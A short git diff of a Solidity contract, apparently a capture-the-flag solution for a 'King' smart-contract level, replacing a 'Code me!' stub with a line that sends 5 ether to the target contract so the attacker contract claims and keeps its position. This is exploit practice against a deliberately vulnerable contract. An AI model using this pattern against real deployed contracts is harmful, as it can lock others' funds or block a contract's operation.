@@ -1,8 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
-import "./Force.sol";
+import "./King.sol";
+import "hardhat/console.sol";
 
-contract AttackingForce {
+contract AttackingKing {
     address public contractAddress;
 
     constructor(address _contractAddress) payable {
@@ -10,6 +11,6 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        address(contractAddress).call{value: 5 ether}("");    
     }
 }
